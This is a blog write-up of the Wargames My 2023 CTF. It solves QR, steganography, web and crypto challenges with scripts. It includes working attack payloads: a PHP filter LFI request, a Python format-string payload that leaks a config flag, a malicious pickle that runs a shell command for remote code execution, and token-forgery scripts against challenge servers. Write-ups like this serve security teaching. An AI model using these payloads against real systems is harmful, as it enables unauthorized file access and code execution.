---
layout: single
title:  "Wargames My 2023"
date:   2023-12-17 12:01:00 +0800
categories: wargames-2023
permalink: /wargames-2023
---

Writeup for the challenges I solved in Wargames My 2023

This is my fourth time participating in Wargames My. Huge shoutout to my teammates [@DavidTan0527](https://github.com/DavidTan0527) and [@1001mei](https://github.com/1001mei) (`iMonkee Pro Max`) 😆

# Misc

## Splice

> Someone corrupted my QR code! Fortunately I got backup. Someone corrupted my backup!

<div style='display:flex;justify-content:space-between;'>
    <img src='/assets/images/wargames-my-2023/page1.png' width="250">
    <img src='/assets/images/wargames-my-2023/page2.png' width="250">
    <img src='/assets/images/wargames-my-2023/page3.png' width="250">
</div>


### Observation

We are given 3 qr code and our task seems to be recovering them.

A nice observation is that the 3rd qr code is a combination of the first 2 qr code. If you observe closely, you can see that there are 3 types of color (opacity cuz it's transparent) in the image. 

Nothing, Grey and Black

We can match this with the previous 2 qr, we found out that 

1. If a spot is black, then the same spot for the 2 qr are black.
2. If a spot is white, then the same spot for the 2 qr are white.
3. If a spot is grey, then the same spot for the either one of the is black.

Also notice that each block is approximately 57 x 57 pixels.


### Solution

With this observation we code out our solution

My solution is quite brutal, no smart tricks.

First I populate a 2d matrix for each of the pixel, loop through every 57 x 57 box and get their color

```python
from PIL import Image

image1 = Image.open("page1.png")
image2 = Image.open("page2.png")
image3 = Image.open("page3.png")

image1_pixels = []
image2_pixels = []
image3_pixels = []

for y in range(0, height - 57, 57):
    row1 = []
    row2 = []
    row3 = []
    for x in range(0, width - 57, 57):
        pixel1 = image1.getpixel((x + 30, y + 30))
        row1.append(pixel1[0])

        pixel2 = image2.getpixel((x + 30, y + 30))
        row2.append(pixel2[0])

        pixel3 = image3.getpixel((x + 30, y + 30))
        row3.append(pixel3[3])
    image1_pixels.append(row1)
    image2_pixels.append(row2)
    image3_pixels.append(row3)

```

Then I loop through the matrix and change the value according to our observation, here we only change the row/column if it is all white boxes 

```python
for i in range(n):
    allwhite = True
    for j in range(m):
        if (image2_pixels[i][j] != 255):
            allwhite = False
            break
    if (allwhite):
        for j in range(m):
            if (image1_pixels[i][j] == 255):
                if (image3_pixels[i][j] == 0):
                    image2_pixels[i][j] = 255
                else:
                    image2_pixels[i][j] = 0
            else:
                if (image3_pixels[i][j] == 214):
                    image2_pixels[i][j] = 0
                else:
                    image2_pixels[i][j] = 255

for j in range(m):
    allwhite = True
    for i in range(n):
        if (image1_pixels[i][j] != 255):
            allwhite = False
            break
    if (allwhite):
        for i in range(n):
            if (image2_pixels[i][j] == 255):
                if (image3_pixels[i][j] == 0):
                    image1_pixels[i][j] = 255
                else:
                    image1_pixels[i][j] = 0
            else:
                if (image3_pixels[i][j] == 214):
                    image1_pixels[i][j] = 0
                else:
                    image1_pixels[i][j] = 255

```

Then recreate the qr

```python
outimage1 = Image.new("RGB", (width, height), color='white')
outimage2 = Image.new("RGB", (width, height), color='white')

for i in image2_pixels:
    print(i)


for y in range(57, height - 57, 57):
    for x in range(57, width - 57, 57):
        t = image1_pixels[y//57][x//57]
        for k1 in range(57):
            for k2 in range(57):
                outimage1.putpixel((x + k1, y + k2), (t,t,t))
        t = image2_pixels[y//57][x//57]
        for k1 in range(57):
            for k2 in range(57):
                outimage2.putpixel((x + k1, y + k2), (t,t,t))

outimage1.save(open("outimage1.png", 'wb'))
outimage2.save(open("outimage2.png", 'wb'))
```

Stupid solution but it works!

<div style='display:flex;justify-content:space-around;margin-bottom:15px;'>
    <img src='/assets/images/wargames-my-2023/outimage1.png' width="250">
    <img src='/assets/images/wargames-my-2023/outimage2.png' width="250">
</div>


We get 2 base64 strings, combine it to get the flag


Full script

```python
from PIL import Image

image1 = Image.open("page1.png")
image2 = Image.open("page2.png")
image3 = Image.open("page3.png")


# Get the dimensions of the image
width, height = image1.size

print(width)
print(height)

image1_pixels = []
image2_pixels = []
image3_pixels = []

for y in range(0, height - 57, 57):
    row1 = []
    row2 = []
    row3 = []
    for x in range(0, width - 57, 57):
        pixel1 = image1.getpixel((x + 30, y + 30))
        row1.append(pixel1[0])

        pixel2 = image2.getpixel((x + 30, y + 30))
        row2.append(pixel2[0])

        pixel3 = image3.getpixel((x + 30, y + 30))
        row3.append(pixel3[3])
    image1_pixels.append(row1)
    image2_pixels.append(row2)
    image3_pixels.append(row3)

n = len(image1_pixels)
m = len(image1_pixels[0])

for i in range(n):
    allwhite = True
    for j in range(m):
        if (image2_pixels[i][j] != 255):
            allwhite = False
            break
    if (allwhite):
        for j in range(m):
            if (image1_pixels[i][j] == 255):
                if (image3_pixels[i][j] == 0):
                    image2_pixels[i][j] = 255
                else:
                    image2_pixels[i][j] = 0
            else:
                if (image3_pixels[i][j] == 214):
                    image2_pixels[i][j] = 0
                else:
                    image2_pixels[i][j] = 255

for j in range(m):
    allwhite = True
    for i in range(n):
        if (image1_pixels[i][j] != 255):
            allwhite = False
            break
    if (allwhite):
        for i in range(n):
            if (image2_pixels[i][j] == 255):
                if (image3_pixels[i][j] == 0):
                    image1_pixels[i][j] = 255
                else:
                    image1_pixels[i][j] = 0
            else:
                if (image3_pixels[i][j] == 214):
                    image1_pixels[i][j] = 0
                else:
                    image1_pixels[i][j] = 255


outimage1 = Image.new("RGB", (width, height), color='white')
outimage2 = Image.new("RGB", (width, height), color='white')

for i in image2_pixels:
    print(i)


for y in range(57, height - 57, 57):
    for x in range(57, width - 57, 57):
        t = image1_pixels[y//57][x//57]
        for k1 in range(57):
            for k2 in range(57):
                outimage1.putpixel((x + k1, y + k2), (t,t,t))
        t = image2_pixels[y//57][x//57]
        for k1 in range(57):
            for k2 in range(57):
                outimage2.putpixel((x + k1, y + k2), (t,t,t))

outimage1.save(open("outimage1.png", 'wb'))
outimage2.save(open("outimage2.png", 'wb'))
```

## Sayur

> Sayur Kemudian Lebih Latih

<div style='display:flex;justify-content:space-around;'>
    <img src='/assets/images/wargames-my-2023/sayur.png' width="500">
</div>

### Observation

Putting it into setgsolve.jar, we can see it looks suspicious in the top part of red,green,blue,alpha plane 1,2 

Here I only show 3 of them

<div style='display:flex;justify-content:space-around;margin-bottom:12px'>
    <img src='/assets/images/wargames-my-2023/sayur1.png' width="800">
</div>

<div style='display:flex;justify-content:space-around;margin-bottom:12px'>
    <img src='/assets/images/wargames-my-2023/sayur2.png' width="800">
</div>

<div style='display:flex;justify-content:space-around;margin-bottom:12px'>
    <img src='/assets/images/wargames-my-2023/sayur3.png' width="800">
</div>

This strongly hints us that LSB steganography trick is used in the image.

### Solution

To extract the bit, I just loop through each of the pixel and combine the last 2 bits of R,G,B,A

```python
from PIL import Image
from Crypto.Util.number import long_to_bytes

# Open an image file
image_path = "sayur.png"
image = Image.open(image_path)

# Get the dimensions of the image
width, height = image.size

output = ''
# Loop through each pixel in the image
for y in range(height):
    for x in range(width):
        # Get the pixel value at (x, y)
        pixel = image.getpixel((x, y))
        # Do something with the pixel value (for instance, print it)
        t = ''
        if (pixel[0] == 0): t += '00'
        elif (pixel[0] == 1): t += '01'
        else: t += bin(pixel[0])[-2:]

        if (pixel[1] == 0): t += '00'
        elif (pixel[1] == 1): t += '01'
        else: t += bin(pixel[1])[-2:]

        if (pixel[2] == 0): t += '00'
        elif (pixel[2] == 1): t += '01'
        else: t += bin(pixel[2])[-2:]

        if (pixel[3] == 0): t += '00'
        elif (pixel[3] == 1): t += '01'
        else:t += bin(pixel[3])[-2:]

        output += t

open("output1", "wb").write(long_to_bytes(int(output, 2)))
            
```

Then we get

```
KemudianKemudianSayurSayurKemudianLatihSayurBanyakKemudianBanyakSayurKemudianKemudianBanyakSayurLatihKemudianLatihKemudianSayurKemudianBanyakBanyakKemudianKemudianBanyakSayurLatihKemudianBanyakKemudianKemudianKemudianSayurLatihKemudianKemudianBanyakSayurKemudianKemudianBanyakLatihBanyakKemudianLatihBanyakKemudianKemudianKemudianKemudianSayurKemudianBanyakBanyakSayurKemudianBanyakKemudianKemudianKemudianBanyakLatihBanyakKemudianKemudianKemudianSayurKemudianBanyakBanyakSayurKemudianBanyakKemudianKemudianKemudianBanyakLatihBanyakKemudianSayurLatihKemudianKemudianBanyakSayurKemudianKemudianBanyakLatihBanyakKemudianLatihBanyakKemudianKemudianKemudianSayurSayurKemudianLatihSayurBanyakKemudianBanyakSayurKemudianKemudianBanyakSayurLatihKemudianLatihKemudianSayurKemudianBanyakBanyakKemudianKemudianBanyakSayurLatihKemudianBanyakKemudianKemudianKemudianKemudianKemudianBanyakKemudianBanyakKemudianKemudianKemudianBanyakKemudianLatihKemudianBan...
```

We have 4 words here, 

Kemudian, Sayur, Latih, Banyak

I guessed that each word represent a 2 bits `00, 01, 10, 11` 

To check it, I run through all possible permutation of the mapping

```python
from itertools import permutations
from Crypto.Util.number import long_to_bytes

# Define the initial binary pairs
initial = ['00', '01', '10', '11']

# Generate all permutations of mappings
all_mappings = list(permutations(initial))

f = open("output1", "r").read()

f = f.replace("Kemudian", "1")
f = f.replace("Banyak", "2")
f = f.replace("Sayur", "3")
f = f.replace("Latih", "0")

for mapping in all_mappings:
    output = ''
    for i in f:
        output += mapping[int(i)]
    output = int(output, 2)
    t = long_to_bytes(output)
    open("output2" + str(mapping), "wb").write(t)

```

One of the output will contain

```
PracticeManyThenThenManyPracticeVegetableVegetableManyPracticeVegetableThenPracticeManyThenPracticeManyPracticeManyPracticeManyVegetableVegetablePracticePracticeManyThenThenManyPracticeVegetableVegetableManyPracticeVegetableThenPracticeManyThenPracticeManyPracticeManyPracticeManyVegetableVegetablePracticePracticeManyThenThenManyPracticeVegetableVegetableManyPracticeVegetableThenPracticeManyThenThenManyManyThenVegetableManyThenManyManyPracticeManyThenThenManyPracticeVegetableVegetableManyPracticeVegetableThenPracticeManyThenPracticeManyPracticeManyPracticeManyVegetableVegetablePracticePracticeManyThenThenManyPracticeVegetableVegetableManyPracticeVegetableThenPracticeManyThenThenManyManyThenVegetableManyThenManyManyPracticeManyThenPracticeManyPracticeManyPracticeManyVegetableVegetablePracticePracticeManyThenThenManyPracticeVegetableVegetableManyPracticeVegetableThenPracticeManyThenThenManyPracticeVegetableVegetableManyPracticeVegetableThenPracticeManyThenPracticeManyPracticeManyPracticeManyVegetableVegetablePracticePracticeManyThenThenManyManyThenVegetableManyThenManyManyPracticeMany...
```

Repeat the same process, we get 

```
就练就练就多就练就多练就就练多就就练多练菜练菜菜就多菜练就多就就就多菜练菜练菜就菜练菜菜菜练就多菜练菜多菜练多菜菜练菜菜菜练多就就多菜就就多就菜菜练就菜就多就就菜练菜练菜练多就菜练菜练就多就多菜练菜菜就多菜就就多菜练就多菜多就多就多就多菜就菜练多菜菜练多就菜练就就就多就多菜练菜多菜练多就就多就多就练练就
```

Repeat again and get the flag.

# Web

## Warmup-Web 

> Let's warm up! http://warmup.wargames.my

### Solution

We see a login portal with a password to key in, upon further inspection, we found out there is an obfuscated js code

<div style='display:flex;justify-content:space-around;margin-bottom:12px'>
    <img src='/assets/images/wargames-my-2023/web1.png' width="800">
</div>

Use online deofuscater [https://obf-io.deobfuscate.io/](https://obf-io.deobfuscate.io/), we then get the password and the api endpoint

```js
...
document.querySelector('button').addEventListener("click", _0x3ac921 => {
  _0x3ac921.preventDefault();
  if (document.querySelector("input").value === "this_password_is_so_weak_i_can_crack_in_1_sec!") {
    fetch("/api/4aa22934982f984b8a0438b701e8dec8.php?x=flag_for_warmup.php").then(_0x5c12f5 => _0x5c12f5.text()).then(_0x509e6e => Swal.fire({
      'title': "Good job!",
      'html': _0x509e6e,
      'icon': "success"
    }));
  } else {
    Swal.fire({
      'title': "Oops...",
      'text': "wrong password",
      'icon': "error"
    });
  }
});
```

Accessing `/api/4aa22934982f984b8a0438b701e8dec8.php?x=flag_for_warmup.php` directly give us 

<div style='display:flex;justify-content:space-around;margin-bottom:12px'>
    <img src='/assets/images/wargames-my-2023/web2.png' width="800">
</div>

The flag is probably hidden in the source code of the file `flag_for_warmup.php`

But the `?x=` seems very suspicious to LFI, we may be able to get the source code out.

Using common technique, 

```
?x=file://flag_for_warmup.php
?x=php://filter/convert.base64-decode/flag_for_warmup.php
```
We see that it is all blocked by the server.

<div style='display:flex;justify-content:space-around;margin-bottom:12px'>
    <img src='/assets/images/wargames-my-2023/web3.png' width="800">
</div>

(Apparently we can bypass it using url encoding, but I didn't use that during the competition)

My final payload is using

```
?x=php://filter/zlib.deflate/resource=./flag_for_warmup.php"
```

basically it will compress the file content and send the output to us.

I coded a simple script to get the flag

```python
import requests

url = "https://warmup.wargames.my/api/4aa22934982f984b8a0438b701e8dec8.php?x=php://filter/zlib.deflate/resource=./flag_for_warmup.php"

r = requests.get(url)

open("out", "wb").write(r.content)
```

```php
<?php
$compressedData = file_get_contents('out');
$decompressedData = gzinflate($compressedData);
echo $decompressedData;
?>
```

## Pet Store Viewer

> Explore our online pet store for adorable companions – from playful kittens to charming chickens. Find your perfect pet today. Buy now and bring home a new friend!

### Solution

For this challenge, we are given a simple Flask app that shows pet

```python

from flask import Flask, render_template, url_for ,request
import os
import defusedxml.ElementTree as ET

app = Flask(__name__)

CONFIG = {
    "SECRET_KEY" : os.urandom(24),
    "FLAG" : open("/flag.txt").read()
}

...

def parse_xml(xml):
    try:
        tree = ET.fromstring(xml)
        name = tree.find("item")[0].text
        price = float(tree.find("item")[1].text)
        description = tree.find("item")[2].text
        image_path = tree.find("item")[3].text
        gender = tree.find("item")[4].text
        size = tree.find("item")[5].text
        details = PetDetails(name,price,description,image_path,gender,size)
        combined_items = ("{0.name};"+str(details.price)+";{0.description};"+details.image_path+";{0.gender};{0.size}").format(details)
        return [combined_items]
    except Exception as e:
        print(e)
        print("Malformed xml, skipping")
        return []


@app.route('/view')
def view():
    xml = request.args.get('xml')
    list_results = parse_xml(xml)
    if list_results:
        items = list_results[0].split(";")
        return render_template('view.html',value=items)
    else:
        return render_template('error.html')
```

There are few observation here, first it is using defusedxml, which is library designed to be protected against XXE attack. It is using the latest version somemore. So unless we can find 0-day, XXE is most likely not the problem.

All the flask template also looks fine, we are not able to have our input directly modify the template string.

So the only possible vulnerability here is the python format string

The basic idea of python format string is if I can modify the template string, then I can have control of the program.

```python
("{0.name};"+str(details.price)+";{0.description};"+details.image_path+";{0.gender};{0.size}").format(details)
```

name, price, description gender and size are all protected.
 
But `details.image_path` is added directly to the string.

So when I set it to be `{0.name}`, I will get the pet name as the output. To exploit this, just set it to `{0.__init__.__globals__[CONFIG][FLAG]}` to get the FLAG in the global object `CONFIG`

Final script

```python
import requests

url = "http://13.229.84.41:8222/view"

data = """<?xml version="1.0" encoding="UTF-8"?>
<items>
    <item>
        <name>hello</name>
        <price>2.0</price>
        <description>1</description>
        <image_path>{0.__init__.__globals__[CONFIG][FLAG]}</image_path>
        <gender>2</gender>
        <size>2</size>
    </item>
</items>
"""

r = requests.get(url, params={"xml": data})

print(r.text)
```

## My First AI Project

> Explore my beginner-friendly web UI for testing an AI project!

### Observation

This is another Flask app that allow us to upload dataset and load model then do prediction

Looking at the code, we are able to upload files to the server

```python
@app.route('/uploads', methods=['POST'])
def uploads():
    if request.method == 'POST':
        f = request.files['dataset']
        for file in os.scandir(os.path.join(app.root_path, 'uploads')):
            if file.name.endswith(".csv"):
                os.unlink(file.path)
        if not f.filename.endswith(".csv"):
            return 'Failed to upload, ensure the dataset ends with .csv'
        now = datetime.now()
        files = ''.join(random.choices(string.ascii_uppercase, k=5)) + "_" + now.strftime("%d_%m_%Y")
        filename =  'walah' + ".csv"
        pathfile = os.path.join(app.root_path, 'uploads', secure_filename(filename))
        f.save(pathfile)
        time.sleep(1) # Ensure file uploaded successfully
        uploaded_dataset = pd.read_csv(pathfile)
        try:
            X = uploaded_data[['X', 'Y']]
            Y = uploaded_data['Target']
            
            model = LinearRegression()
            model.fit(X, Y)

            with open("uploads/pickled/"+ files + ".pkl", "wb") as model_file:
                pickle.dump(model, model_file)   
            return 'dataset uploaded successfully'     
        except:
            return 'dataset failed to upload'   
```

And then we are also able get the directory listing

```python
@app.route('/listsubDir', methods=['POST'])
def list_sub_dir():
    input_value = request.form.get('input') 
    subdirectories = list_subdirectories(input_value)  

    preview_html = ''
    for subdir in subdirectories:
        preview_html += f'{subdir}\n'
    preview_html += ''

    if len(subdirectories) != 0:
        return jsonify({'preview': preview_html})
    else:
        return jsonify({'preview': f"cannot access '{input_value}': No such file or directory"})
```

Lastly, we can let it load a pickle file

```python
@app.route('/loadModel', methods=['POST'])
def load_model():
    if request.method == 'POST':
        filenames = "/Users/mechfrog88/Desktop/CTF/wargames-23/web-ai/uploads/walah.csv"
        if waf(filenames):
            return "Access Denied"
        try:
            with open(filenames, "rb") as model_file:
                loaded_model = np.load(model_file, allow_pickle=True)
                
            new_data = np.array([[4, 5], [5, 6]])
            predictions = loaded_model.predict(new_data)
            return "Data = %s Predictions for New Data: %s" % (str(new_data),str(predictions))
        except:
            return "Failed to load model. Ensure you give pickle data.Preview:" +open(filenames,"rb").read().decode()+""
```

So this is definitely python pickle deserialization vulnerability.

### Solution

So to solve this challenge, we upload a malicious pickle object the server, and let the server to load the pickle to get RCE.

The `__reduce__` method will always be called when the pickle object is loaded

```python
import pickle, os
import requests

class RCE:
    def __reduce__(self):
        return os.system, ("cp /flag.txt /test.txt",)
    
pickledPayload = pickle.dumps(RCE())
open("out.csv", "wb").write(pickledPayload)

url = "http://13.229.150.169:33873"
r = requests.post(url + "/uploads", files={"dataset": open("out.csv", 'rb')})
```

I tried creating a reverse shell or connecting to my own server but it doesn't work. So end up having to use this weird `cp /flag.txt /test.txt` approach to get the flag.

Then we load `/text.txt` as the model to get the flag

# Crypto

## N-less RSA

> Endless RSA?

```python
from Crypto.Util.number import getStrongPrime,bytes_to_long
from gmpy2 import next_prime
from secret import flag

def generate_secure_primes():
	p = getStrongPrime(1024)
	q = int(next_prime(p*13-37*0xcafebabe))
	return p,q

# Generate two large and secure prime numbers
p,q = generate_secure_primes()
n = p*q
e = 0x10001
phi = (p-1)*(q-1)
c = pow(bytes_to_long(flag),e,n)

print(f"{phi=}")
print(f"{e=}")
print(f"{c=}")

# Output
# phi=...
# e=65537
# c=...
```

### Observation

We see that `phi` is provided but `n` is not provided, usually if this is the case, we can try to factorise `phi` and combine the factors and hope to get back the prime factor of `n`. 

For this challenge it is easier because we are given how `p` and `q` are generated. 

```python
def generate_secure_primes():
	p = getStrongPrime(1024)
	q = int(next_prime(p*13-37*0xcafebabe))
	return p,q
```

Since what `next_prime` do is just iteratively trying all numbers and see which is a prime, the prime that we get must be very close to `p*13-37*0xcafebabe`

So we can write `q = p*13-37*0xcafebabe + e`


### Solution

My solution is to just loop through the `e`, we know `e` is small so this is possible.

For each `e`, we try to solve equation 

```
(p - 1) * (q - 1) = phi
(p - 1) * (p*13-37*0xcafebabe + e - 1) = phi
```

I used sagemath to solve the eqation.

Final solution

```python
from Crypto.Util.number import long_to_bytes

F.<p> = ZZ[]

phi=...
e=65537
c=...

for e in range(1000):
    f = (p - 1) * (p*13-37*0xcafebabe + e) - phi
    if (len(f.roots()) == 0):
        continue
    p = f.roots()[0][0]
    q = phi // (p - 1) + 1
    n = p * q; d = pow(e, -1, phi); m = pow(c, d, n)
    print(long_to_bytes(m))
    break
```

## Hohoho 2

> "Santa is coming to town! Send wishes to santa by connect to the netcat service"


<button class="collapsible btn" id="substitute">server.py</button>

<div class="content" id="substitutedata" style="display:none" markdown="1">

```python
#!/usr/bin/env python3
import hashlib
from Crypto.Util.number import *

m = 0xb00ce3d162f598b408e9a0f64b815b2f
a = 0xaaa87c7c30adc1dcd06573702b126d0d
c = 0xcaacf9ebce1cdf5649126bc06e69a5bb
n = getRandomNBitInteger(64)

class User:
	def __init__(self, name, token):
		self.name = name
		self.mac = token

	def verifyToken(self):
		x = bytes_to_long(self.name.encode(errors="surrogateescape"))
		# LCG fast skip implementation
		# is equivalent to the following code
		# for _ in range(n):
		# 	x = (a*x + c) % m
		x = ((pow(a, n, (a-1)*m) - 1) // (a-1) * c + pow(a, n, m) * x) % m
		return hex(x)[2:] == self.mac

def generateToken(name):
	x = bytes_to_long(name.encode(errors="surrogateescape"))
	x = ((pow(a, n, (a-1)*m) - 1) // (a-1) * c + pow(a, n, m) * x) % m
	return hex(x)[2:]

def printMenu():
	print("1. Register")
	print("2. Login")
	print("3. Make a wish")
	print("4. Wishlist (Santa Only)")
	print("5. Exit")

def main():
	print("Want to make a wish for this Christmas? Submit here and we will tell Santa!!\n")
	user = None
	while(1):
		printMenu()
		try:
			option = int(input("Enter option: "))
			if option == 1:
				name = str(input("Enter your name: "))
				if "Santa Claus" in name:
					print("Cannot register as Santa!\n")
					continue
				print(f"Use this token to login: {generateToken(name)}\n")
				
			elif option == 2:
				name = input("Enter your name: ")
				mac = input("Enter your token: ")
				user = User(name, mac)
				if user.verifyToken():
					print(f"Login successfully as {user.name}")
					print("Now you can make a wish!\n")
				else:
					print("Ho Ho Ho! No cheating!")
					break
			elif option == 3:
				if user:
					wish = input("Enter your wish: ")
					open("wishes.txt","a").write(f"{user.name}: {wish}\n")
					print("Your wish has recorded! Santa will look for it!\n")
				else:
					print("You have not login yet!\n")

			elif option == 4:
				if user and "Santa Claus" in user.name:
					wishes = open("wishes.txt","r").read()
					print("Wishes:")
					print(wishes)
				else:
					print("Only Santa is allow to access!\n")
			elif option == 5:
				print("Bye!!")
				break
			else:
				print("Invalid choice!")
		except Exception as e:
			print(str(e))
			break

if __name__ == "__main__":
	main()
```

</div>

### Observation

To get the flag, we need to login with a user that contains `Santa Claus` in the name. 

The server provides an oracle to generate token to login, but it will exits immediately if our name contains `Santa Claus` 

So we need to forge token.

### Solution

Looking at how token is generated, the `n` is a secret, but everything else is given.

```python
def generateToken(name):
    # LCG fast skip implementation
    # is equivalent to the following code
    # for _ in range(n):
    # 	x = (a*x + c) % m
    x = bytes_to_long(name.encode(errors="surrogateescape"))
    x = ((pow(a, n, (a-1)*m) - 1) // (a-1) * c + pow(a, n, m) * x) % m
    return hex(x)[2:]
```

What the fast implementation is doing is basically just applying geometric progression formula.

Cuz for LCG, token $$T$$ for a $$x$$ is 

$$
\begin{aligned}
    T &= [[[ax + c] \cdot a + c] \dots]\\
    &= x \cdot a^n + c \cdot a^{n-1} + \dots + c\\
    &= x \cdot a^n + c \cdot (a^{n-1} + a^{n-2} + \dots + a^{0})\\
    &= x \cdot a^n + c \cdot ( \dfrac{a^{n} - 1}{a - 1} )
\end{aligned}
$$

Note that this formula usually only works when $$a < 1$$ otherwise it will diverge. However, because we are doing it modulo $$m$$, divergence is not a problem here and the formula is correct.

So to solve this challenge, we just give it a random name $$x$$ to get $$T$$

$$
\begin{aligned}
    T &= x \cdot a^n + c \cdot ( \dfrac{a^{n} - 1}{a - 1} )\\
    T \cdot (a - 1) &= x(a-1) \cdot a^n + c \cdot (a^{n} - 1)\\
    T \cdot (a - 1) &= x(a-1) \cdot a^n + c \cdot a^{n} - c \\
    a^n &= \dfrac{T(a - 1) + c}{x(a-1) + c}
\end{aligned}
$$

Since the modulus $$m$$ is quite small, we can solve discrete logarithm on $$a^n$$. After getting the $$n$$, forging token is trivial.

Sagemath solution

```python
from pwn import *
from Crypto.Util.number import bytes_to_long

r = remote("13.229.150.169", int(32958))

m = 0xb00ce3d162f598b408e9a0f64b815b2f
a = 0xaaa87c7c30adc1dcd06573702b126d0d
c = 0xcaacf9ebce1cdf5649126bc06e69a5bb

def generateToken(name):
	x = bytes_to_long(name.encode(errors="surrogateescape"))
	x = ((pow(a, n, (a-1)*m) - 1) // (a-1) * c + pow(a, n, m) * x) % m
	return hex(x)[2:]

name = "hello"
r.sendline(b"1")
r.sendline(name)
r.recvuntil("token to login: ")
token = int(r.recvline().decode(), 16)

kk = bytes_to_long(name.encode(errors="surrogateescape"))

F.<x> = Zmod(m)[]
f = x*kk + c * (x - 1) / (a - 1) - token
lst = f.coefficients()
target = (-lst[0]) / lst[1]

## Discrete log
n = int(target.log(a))

realToken = generateToken("Santa Claus")

r.sendline(b"2")
r.sendline(b"Santa Claus")
r.sendline(realToken)
r.sendline(b"4")
r.interactive()
```

## Hohoho 2 Continue

> Someone exploited the service! Disabled the registration for the service

<button class="collapsible btn" id="substitute2">server.py</button>

<div class="content" id="substitute2data" style="display:none" markdown="1">

```python
#!/usr/bin/env python3
import hashlib
from Crypto.Util.number import *

m = 0xb00ce3d162f598b408e9a0f64b815b2f
a = 0xaaa87c7c30adc1dcd06573702b126d0d
c = 0xcaacf9ebce1cdf5649126bc06e69a5bb
n = getRandomNBitInteger(64)

class User:
	def __init__(self, name, token):
		self.name = name
		self.mac = token

	def verifyToken(self):
		x = bytes_to_long(self.name.encode(errors="surrogateescape"))
		# LCG fast skip implementation
		# is equivalent to the following code
		# for _ in range(n):
		# 	x = (a*x + c) % m
		x = ((pow(a, n, (a-1)*m) - 1) // (a-1) * c + pow(a, n, m) * x) % m
		return hex(x)[2:] == self.mac
		
def generateToken(name):
	x = bytes_to_long(name.encode(errors="surrogateescape"))
	x = ((pow(a, n, (a-1)*m) - 1) // (a-1) * c + pow(a, n, m) * x) % m
	return hex(x)[2:]

def printMenu():
	print("1. Register (Disabled)")
	print("2. Login")
	print("3. Make a wish")
	print("4. Wishlist (Santa Only)")
	print("5. Exit")

def main():
	print("Want to make a wish for this Christmas? Submit here and we will tell Santa!!\n")
	user = None
	while(1):
		printMenu()
		try:
			option = int(input("Enter option: "))
			if option == 1:
				# TODO: Fix forge token bug
				print("Disabled because got serious bug!\n")
			elif option == 2:
				name = input("Enter your name: ")
				mac = input("Enter your token: ")
				print(name)
				print(mac)
				user = User(name, mac)
				if user.verifyToken():
					print(f"Login successfully as {user.name}")
					print("Now you can make a wish!\n")
				else:
					print("Ho Ho Ho! No cheating!")
					break
			elif option == 3:
				if user:
					wish = input("Enter your wish: ")
					open("wishes.txt","a").write(f"{user.name}: {wish}\n")
					print("Your wish has recorded! Santa will look for it!\n")
				else:
					print("You have not login yet!\n")

			elif option == 4:
				if user and "Santa Claus" in user.name:
					print("GOTFLAG")
				else:
					print("Only Santa is allow to access!\n")
			elif option == 5:
				print("Bye!!")
				break
			else:
				print("Invalid choice!")
		except Exception as e:
			print(str(e))
			break

if __name__ == "__main__":
	main()
```

</div>

### Observation

The modification here is that the registration portal is now disabled. We can't just get a token $$T$$ and solve discrete log


### Solution

To solve this, we have to exploit the fact that LCG is not a very good psuedo random generator.

We can try to find $$x$$ such that 

$$x = ax + c \text{ (mod } N)$$

To find this value

$$
\begin{aligned}
    x &= ax + c\\
    x - ax &= c\\
    x &= \dfrac{c}{1 - a}
\end{aligned}
$$

This value is good because $$x$$ remains the same no matter the iteration $$n$$

So now the next question is how to get a valid text such that when it modulo $$m$$ it will become $$x$$? In the discord channel we had some discussion and apparently you can just brute force and solve equation with different $$k \cdot m$$ to get a valid text.

However, during the competition I solved it using LLL. It is the same trick as [ABOH-2023 Hash Clash](/aboh-2023#hash-clash)

The integer representation of an ascii text is $$b_n\dots b_2b_1$$

$$
b_n \cdot 256^{n-1} + \dots + b_2 \cdot 256 + b_1
$$

We want this to 

$$
b_n \cdot 256^{n-1} + \dots + b_2 \cdot 256 + b_1 \equiv k \text{ (mod } N)
$$

To make sure that it contains the word `Santa Clause`

$$
\begin{aligned}
    \text{`S'} \cdot 256^{n + k} + \dots + \text{`s'} \cdot 256^{n + 1} + \text{`e'} \cdot 256^{n} + &\\ b_n \cdot 256^{n-1} + \dots + b_2 \cdot 256 + b_1 &\equiv k \text{ (mod } N)
\end{aligned}
$$

Add offset 70 to each of the $$b_i$$ to give LLL a better bound to work with, so now our target is $$\| b_i \| < 30$$

$$
\begin{aligned}
    \text{`S'} \cdot 256^{n + k} + \dots + \text{`s'} \cdot 256^{n + 1} + \text{`e'} \cdot 256^{n} + &\\ (b_n + 70) \cdot 256^{n-1} + \dots + ( b_2 + 70) \cdot 256 + (b_1 + 70) &\equiv k \text{ (mod } N)
\end{aligned}
$$

Construct the LLL matrix, where $$T$$ is the constant term of the equation above, $$X$$ is the padding to make sure that column will be 0 after performing reduction

$$
\begin{bmatrix}
    1 & 0 & 0 & \dots & 256^{n-1} \cdot X & 0\\
    0 & 1 & 0 & \dots & 256^{n-2} \cdot X & 0\\
    0 & 0 & 1 & \dots & 256^{n-3} \cdot X & 0\\
    \vdots & \vdots & \vdots & \ddots & \vdots & \vdots\\
    0 & 0 & 0 & \dots & T \cdot X & 1
\end{bmatrix}
$$

As long as the last column is 1 and the second last column is 0, then we have a solution

Final solution script

```python
from pwn import *
from Crypto.Util.number import bytes_to_long

r = remote("13.229.84.41", int(2001))

m = 0xb00ce3d162f598b408e9a0f64b815b2f
a = 0xaaa87c7c30adc1dcd06573702b126d0d
c = 0xcaacf9ebce1cdf5649126bc06e69a5bb

## Solve for x
F.<x> = GF(m)[]
f = (a*x + c) - x
t = f.roots()[0][0]

## Number of characters
n = 32

target = b"Santa Claus"
target = target[::-1]

## Find the constant term
f = 0
for j in range(n):
    f = f + 70 * 256^j
for j in range(len(target)):
    f = f + target[j] * (256) ^ (n + j)
f = f - t

## Construct the Matrix
M = []
for j in range(n):
    arr = [1 if j == k else 0 for k in range(n)]
    arr.append(int((256**(j)) % m) << 100)
    arr.append(0)
    M.append(arr)
    
M.append([0 for _ in range(n)] + [int(f) << 100, 1])
M = Matrix(ZZ, M).LLL()

## Get the good row
for i in range(n):
    if (M[i][-1] == 1):
        row = M[i]
        break

## Get Flag
ans = ''
for i in row[:-2]:
    ans += chr(i + 70)
    
ans = "Santa Claus" + ans[::-1]
x = bytes_to_long(ans.encode(errors="surrogateescape")) % m

realToken = hex(x)[2:]
r.sendline(b"2")
r.sendline(ans)
r.sendline(realToken)
r.sendline(b"4")
r.interactive()
```

# PPC

## Linux Memory Usage

This challenge is solved by [@1001mei](https://github.com/1001mei), I temporarily put it here because he doesn't have a blog site yet

